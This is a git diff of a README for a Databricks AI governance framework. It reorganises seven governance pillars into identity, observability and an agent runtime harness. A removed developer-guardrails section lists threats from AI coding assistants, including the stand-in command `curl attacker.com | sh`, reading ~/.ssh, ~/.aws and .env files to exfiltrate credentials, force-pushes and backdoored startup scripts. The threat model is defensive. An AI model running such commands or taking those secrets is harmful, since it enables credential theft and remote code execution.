@@ -107,78 +107,34 @@ No YAML. No policy engines. No deployment pipelines. SQL is the policy language.
 
 ---
 
-## The Seven Pillars
+## Pillars This Repository Documents
+
+The six questions above are answered across every layer of a Databricks deployment. This repository goes deep on the three pillars where identity and observability are established and where an agent runtime enforces them. The remaining concerns (the network perimeter, data-layer filtering, connection governance, and compliance-as-SQL) are enforced by Databricks platform features, and this repository cites the public documentation where they come up rather than restating them.
 
 ```
 +------------------------------------------------------------------+
 |                     Applied AI Governance                         |
 +------------------------------------------------------------------+
-|                                                                    |
-|  [0] Developer       Build-time guardrails for AI coding tools.   |
-|      Guardrails      Prevent credential exfiltration, destructive |
-|                      operations, and supply chain compromise      |
-|                      during development.                          |
-|                                                                    |
-|  [1] Network         Private connectivity, IP access lists,       |
-|      Access          firewall rules, VPC-SC, serverless NCC.      |
-|      Controls        The perimeter, before identity fires.        |
-|                                                                    |
-|  [2] Identity &      OBO (U2M), M2M, Federation. Three models,   |
-|      Access          one governance plane. OAuth scopes enforce   |
-|      Control         least privilege per token.                   |
-|                                                                    |
-|  [3] Data            Row filters, column masks, ABAC governed     |
-|      Governance      tags. Enforced by the SQL engine; no app     |
-|                      can bypass, no new tool needs integration.   |
-|                                                                    |
-|  [4] Tool & API      UC Connections govern external service       |
-|      Governance      access. GRANT/REVOKE USE CONNECTION is the   |
-|                      on/off switch. Confused deputy defense.      |
-|                                                                    |
-|  [5] Observability   Platform audit (system tables) + app audit   |
-|      & Audit         (custom tables) + MLflow traces. Chain of    |
-|                      custody: human -> tool -> SQL -> data.       |
-|                                                                    |
-|  [6] Policy &        Governance-as-SQL. Declarative, versionable, |
-|      Compliance      queryable. No drift between intent and       |
-|                      enforcement.                                 |
-|                                                                    |
+|  Documented in depth here:                                        |
+|                                                                   |
+|  [1] Identity &      OBO (U2M), M2M, Federation. Three models,    |
+|      Access Control  one governance plane. OAuth scopes enforce   |
+|                      least privilege per token.                   |
+|                                                                   |
+|  [2] Observability   Platform audit + app audit + MLflow traces.  |
+|      & Audit         Chain of custody: human -> tool -> SQL.      |
+|                                                                   |
+|  [3] Agent Runtime   Where identity and observability meet at     |
+|      Harness         runtime: per-user tokens, policy verdicts,   |
+|                      traces, and cost caps around tool calls.     |
+|                                                                   |
+|  Enforced by the platform (cited to Databricks docs):             |
+|  network isolation, row filters and column masks, UC Connections, |
+|  governance-as-SQL for compliance.                                |
 +------------------------------------------------------------------+
 ```
 
-### Pillar 0: Developer Guardrails
-
-**Question:** Is the AI coding assistant doing something dangerous during development?
-
-The newest attack surface. AI coding tools (Claude Code, Copilot, Cursor) have shell access, file system access, and network access on developer machines. An unguarded AI assistant can:
-
-- Read `~/.ssh/`, `~/.aws/`, `.env` files and exfiltrate credentials
-- Execute `curl attacker.com | sh` via obfuscated shell commands
-- `git push --force` to shared branches
-- Write backdoors into startup scripts
-
-This pillar sits outside the Databricks platform; it governs the development process itself. Context-aware tool interception (classifying each operation by what it actually does, not what tool it uses) is the pattern. Allow/deny lists don't scale; contextual classification does.
-
-**Future-proof because:** Every new AI coding tool will have the same attack surface: file access, shell access, network access. The classification model adapts; the threat categories are stable.
-
-### Pillar 1: Network Access Controls
-
-**Question:** Can the request even reach the AI service?
-
-| Control | What it does |
-|---------|-------------|
-| Private Link / PSC | No public internet path to workspace |
-| IP Access Lists | Restrict API/UI to known CIDR ranges |
-| Serverless NCC | Private connectivity from serverless compute to customer VNets |
-| VPC-SC (GCP) | Data exfiltration prevention at the cloud perimeter |
-| NSG / Firewall Rules | Restrict egress from compute to approved destinations |
-| Apps Networking | Databricks Apps run in control plane with managed private endpoints |
-
-This is the foundation. If the network doesn't allow it, nothing else matters. Every AI service on Databricks (SQL Warehouse, Model Serving, Genie, Apps) can be fully private, with zero public endpoints.
-
-**Future-proof because:** Network isolation is a physical property, not a software feature. New AI services inherit the workspace's network configuration automatically. You never need to "add firewall rules for Genie": it runs on the same private infrastructure.
-
-### Pillar 2: Identity & Access Control
+### Pillar 1: Identity & Access Control
 
 **Question:** Who is making this request, and what capabilities does their token grant?
 
@@ -192,48 +148,9 @@ Three identity models, one governance plane:
 
 OAuth scopes enforce least privilege per token: `sql`, `genie`, `serving`, never `all-apis`. The scope is the maximum capability; UC grants are the actual authorization.
 
-**Future-proof because:** Every new Databricks AI service will support OAuth tokens and UC identity. The three models cover all possible caller types (human-with-account, machine, human-without-account). New services don't require new identity patterns.
+**Future-proof because:** Every new Databricks AI service supports OAuth tokens and UC identity. The three models cover all caller types (human-with-account, machine, human-without-account), so new services do not require new identity patterns.
 
-### Pillar 3: Data Governance
-
-**Question:** Given this identity, what data can they see?
-
-Four layers, all enforced by the SQL engine:
-
-1. **Catalog/Schema privileges:** `GRANT USE CATALOG`, `GRANT SELECT`
-2. **ABAC governed tags:** dynamic access based on classification tags
-3. **Row filters:** `is_member('west_sales')` restricts rows by group
-4. **Column masks:** `CASE WHEN is_member('finance') THEN margin_pct ELSE NULL END`
-
-The key insight: these fire automatically for every query, regardless of which AI service issues the SQL. Genie, Agent Bricks, custom MCP servers, Model Serving: all get the same governance because all ultimately issue SQL.
-
-**Future-proof because:** Any AI service that reads data must go through the SQL engine. The SQL engine enforces governance. New AI services inherit data governance on day one, with zero integration work.
-
-### Pillar 4: Tool & API Governance
-
-**Question:** Can this identity use this external tool or service?
-
-UC Connections are the governance primitive:
-
-```sql
--- Executive can access GitHub
-GRANT USE CONNECTION ON CONNECTION github_api TO `sp-role-executive`;
-
--- Sales cannot
-REVOKE USE CONNECTION ON CONNECTION github_api FROM `sp-role-sales`;
-```
-
-This prevents the confused deputy attack: a privileged MCP server cannot be tricked into calling external APIs on behalf of an unauthorized user, because the SQL engine checks `USE CONNECTION` before the HTTP request fires.
-
-Two layers of defense:
-1. **Application RBAC:** tool-level access matrix (which roles can call which tools)
-2. **Platform enforcement:** UC `USE CONNECTION` (which identities can use which connections)
-
-Either layer is sufficient to deny. Both must pass for access.
-
-**Future-proof because:** The pattern "can this identity call this external service?" applies to any external integration: REST APIs, MCP servers, database connections, SaaS tools. The connection type changes; the governance primitive doesn't.
-
-### Pillar 5: Observability & Audit
+### Pillar 2: Observability & Audit
 
 **Question:** What happened, and can you prove it?
 
@@ -245,28 +162,17 @@ Three complementary layers:
 | **App audit** | Custom Delta table | Tool calls, human email (behind SP), latency, errors |
 | **MLflow traces** | MLflow experiment | Full request/response, spans, tags, token usage |
 
-The chain of custody: `human -> tool -> SQL -> data`, correlated across all three layers by `request_id`.
+The chain of custody is `human -> tool -> SQL -> data`, correlated across all three layers by `request_id`. Alerts fire on error-rate spikes, P95 latency breaches, safety-score drops, and unusual access patterns.
 
-Alerts fire on: error rate spikes, P95 latency breaches, safety score drops, unusual access patterns.
+**Future-proof because:** Every new AI service writes to `system.access.audit`, so the platform audit surface grows automatically. Application audit is a pattern you implement once (decorator or middleware) and apply to every tool.
 
-**Future-proof because:** Every new AI service writes to `system.access.audit`. The platform audit surface grows automatically. Application audit is a pattern you implement once (decorator/middleware) and apply to every tool.
+### Pillar 3: Agent Runtime Harness
 
-### Pillar 6: Policy & Compliance
+**Question:** As an agent calls tools at runtime, does the caller's identity carry through, and can you see and constrain what it did?
 
-**Question:** Is the governance codified, repeatable, and provable?
+The harness is the layer between an agent and the tools it calls, and it is where the two pillars above become operational. The user's identity is exchanged and propagated so tool calls and SQL run as the real caller, and every policy decision, tool call, and cost event becomes a trace or an audit record. Guardrails such as working-directory confinement, egress allowlists, blast-radius limits, and human-approval gates are expressed as policies with deterministic verdicts, so they are testable rather than aspirational. See [harness/](harness/) and the runnable [omnigent-guardrails-demo/](harness/omnigent-guardrails-demo/).
 
-Governance-as-SQL means:
-- **Queryable state**: `SHOW GRANTS ON TABLE ...` returns the current policy
-- **Versionable**: SQL grant scripts in git, reviewed via PR
-- **Auditable**: Every `GRANT`/`REVOKE` is recorded in `system.access.audit`
-- **Instant**: Changes take effect immediately, no redeployment
-- **Declarative**: The policy IS the SQL, not a translation of policy into code
-
-Federation policies, row filter functions, column mask functions, and connection grants are all SQL objects managed through Unity Catalog. The governance state is always introspectable.
-
-**Future-proof because:** SQL has been the lingua franca of data access control for 50 years. It will outlast any policy engine, any YAML schema, any proprietary policy language.
-
----
+**Future-proof because:** Every agent runtime faces the same two questions, whose identity flows through and what you can observe and constrain. The tools and models change; the identity-and-observability boundary does not.
 
 ## The Adaptability Model
 
@@ -279,7 +185,7 @@ The framework is designed to absorb change at every layer:
 | New identity source (e.g., new IDP) | Token exchange, SP mapping, UC groups | Update federation policy; same SP architecture, same UC groups |
 | New compliance requirement (e.g., new data classification) | ABAC framework, governed tags | Add tag + row filter; no code changes |
 | New attack surface (e.g., prompt injection via tool) | Defense in depth: each layer denies independently | UC enforcement at SQL layer blocks unauthorized data access regardless of prompt manipulation. Prompt security is a cross-cutting concern addressing identity (who sent the prompt), data governance (UC blocks unauthorized access regardless of injection), tool governance (tool description poisoning, response injection), and observability (detecting successful injection) |
-| New AI coding tool | Developer guardrail patterns | Context-aware classification adapts; threat categories are stable |
+| New AI coding tool or agent | Harness policy patterns | Context-aware policy verdicts adapt; the identity and observability boundary stays stable |
 
 The pattern: **new capabilities are additive, not architectural**. You never redesign the governance framework. You extend it by adding a connection, a grant, a tag, or a policy.
 
@@ -309,7 +215,7 @@ This repository's reference documentation is organized around the pillars:
 
 The presentation library ([presentations/](presentations/)) spans 14 talks covering identity, authorization, federation, cost control, UC governance, orchestration, and the applied AI governance model end-to-end.
 
-Pillars 0, 1, 3, 4, and 6 (Developer Guardrails, Network, Data Governance, Tool Governance, and Policy/Compliance) are enforced through Databricks platform features (UC row filters and column masks for data governance, UC Connections for tool governance, system.access.audit for compliance) and are covered implicitly through the identity and observability documentation. Prompt security is a cross-cutting concern addressed in the Identity and Observability pillars.
+The network perimeter, data-layer filtering (UC row filters and column masks), connection governance (UC Connections), and compliance-as-SQL are enforced through Databricks platform features and are cited to the public documentation where they come up, rather than restated as reference docs here. Prompt security is a cross-cutting concern addressed within the identity, observability, and harness pillars.
 
 ---
 
